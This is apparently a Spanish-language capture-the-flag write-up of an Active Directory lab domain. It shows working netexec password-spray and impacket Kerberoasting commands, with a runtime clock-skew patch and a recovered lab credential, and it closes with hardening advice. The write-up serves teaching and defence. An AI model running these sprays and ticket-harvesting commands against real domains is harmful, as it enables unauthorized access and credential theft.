Descripción del Objetivo

Entorno Active Directory

El dominio SOUPEDECODE.LOCAL cuenta con más de 1 000 cuentas de usuario, varias de las cuales presentan credenciales débiles (contraseña igual al nombre de usuario). Enumeración de usuarios mediante RID Brute-Force

El RID brute-force itera sobre los Relative Identifier (RID) del dominio. Cada cuenta tiene un RID único (ej. Administrator = 500, Guest = 501). Acceso Inicial — Password Spray (user=pass)

Técnica: Password Spray con credenciales user=password

El password spray prueba una única contraseña contra múltiples usuarios. A diferencia del brute-force clásico (muchas contraseñas contra un usuario), este método evita los bloqueos de cuenta. La hipótesis es que en un dominio con más de 1 000 usuarios es estadísticamente probable que alguno use su propio nombre de usuario como contraseña.

Precaución operacional: Se ejecuta con intervalo entre intentos para no disparar umbrales de lockout (típicamente 3-5 intentos fallidos en 30 min en entornos por defecto de Windows).
1
Ejecutar password spray — netexec SMB

Se usa netexec smb con la opción de que usuario y contraseña son iguales. La bandera --no-bruteforce hace que cada usuario se intente con su propia contraseña (1:1 en vez de N×M).

Kali — Password Spray (user = password)
netexec smb 10.0.2.9 -u dc01_humans.txt -p dc01_humans.txt --no-bruteforce --continue-on-success 2>/dev/null | grep '+'
Output — Credencial Encontrada

Kerberoasting — TGS-REP Hash Cracking

¿Qué es Kerberoasting?

Cualquier usuario autenticado en un dominio puede solicitar un Ticket de Servicio (TGS) para cualquier cuenta de servicio que tenga un SPN (Service Principal Name) registrado. Este TGS está cifrado con el hash NTLM de la contraseña de la cuenta de servicio. Si la contraseña es débil, puede crackearse offline sin generar alertas adicionales en el DC.

1
Solicitar TGS-REP hashes con impacket GetUserSPNs

Se ejecuta GetUserSPNs.py con las credenciales obtenidas. La herramienta consulta el LDAP del DC para encontrar cuentas con SPN y luego solicita un TGS para cada una, capturando el hash en formato hashcat (-outputformat 2).

Problema encontrado — Clock Skew: El sistema Kali tenía 8 horas de diferencia respecto al DC. Kerberos rechaza tickets con más de 5 minutos de diferencia (KRB_AP_ERR_SKEW). Solución: patch en runtime de impacket.krb5.kerberosv5 añadiendo +8h a todas las llamadas datetime.now(UTC) sin requerir permisos root.
Kali — Kerberoasting (con patch de clock skew)
# Parche de clock skew via importlib (sin sudo) python3 -c " import importlib.util, sys, datetime, pathlib # 1. Localizar kerberosv5.py de impacket import impacket.krb5.kerberosv5 as _k src = pathlib.Path(_k.__file__).read_text() # 2. Parchear todos los datetime.now(UTC) con +8h offset patched = src.replace( 'datetime.datetime.now(datetime.timezone.utc)', '(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=8))' ) # 3. Escribir parche y cargar como módulo tmp = '/tmp/kerberosv5_patched.py' open(tmp,'w').write(patched) spec = importlib.util.spec_from_file_location('impacket.krb5.kerberosv5', tmp) mod = importlib.util.module_from_spec(spec) spec.loader.exec_module(mod) sys.modules['impacket.krb5.kerberosv5'] = mod # 4. Ejecutar GetUserSPNs from impacket.examples.GetUserSPNs import main sys.argv = ['GetUserSPNs.py','SOUPEDECODE.LOCAL/ybob317:ybob317', '-dc-ip','10.0.2.9','-request','-outputfile','/home/kali/kerberoast_hashes.txt'] main() "

Recomendaciones y Hardening

🔒

Política de Contraseñas Robusta

Implementar política de longitud mínima 14 caracteres con complejidad obligatoria. Bloquear contraseñas iguales al nombre de usuario mediante Fine-Grained Password Policies en AD. Usar LAPS para cuentas de máquina.

📊

Monitorizar y Limitar RID Brute-Force

Configurar el DC para rechazar sesiones nulas completas. Activar auditoría en Event ID 4776 (credential validation). Implementar detección de enumeración masiva de cuentas con umbral de alertas en SIEM.

🛡

Mitigar Kerberoasting

Rotar periódicamente contraseñas de cuentas de servicio (mínimo cada 90 días) con herramientas como gMSA (Group Managed Service Accounts) que gestionan contraseñas de 240 caracteres automáticamente. Evitar etype 23 (RC4) activando AES256 exclusivo.

📁

Asegurar Shares con Información Sensible

El share backup no debe ser accesible para cuentas de servicio ordinarias. Restringir acceso de lectura/escritura estrictamente mediante ACLs. Nunca almacenar volcados de credenciales (backup_extract.txt) en shares accesibles por usuarios del dominio.

🛠

Principio de Mínimo Privilegio para Cuentas de Máquina

Las cuentas de máquina (FileServer$) no deben pertenecer a Domain Admins. Revisar la membresía de grupos privilegiados periódicamente. Utilizar herramientas como BloodHound para auditar rutas de ataque en el grafo de AD.

🔌

Mitigar Pass-The-Hash

Implementar Protected Users Security Group para cuentas privilegiadas (fuerza Kerberos AES, impide NTLM auth). Activar Credential Guard en Windows 10/Server 2016+ para proteger hashes en memoria. Deshabilitar WinRM donde no sea necesario.

🔍

Implementar Tier Model (AD Tiering)

Separar las credenciales en 3 niveles: Tier 0 (DC/domain admins), Tier 1 (servers), Tier 2 (workstations). Cuentas de servicio de Tier 2 nunca deben tener acceso a activos de Tier 0. Usar PAWs (Privileged Access Workstations) para administración del DC.

📺

Auditoría y Detección Continua

Habilitar Advanced Audit Policy para Kerberos (Event IDs 4768, 4769, 4771). Detectar solicitudes masivas de TGS con herramientas como ATA o Defender for Identity. Correlacionar accesos a shares sensibles con alertas automáticas.
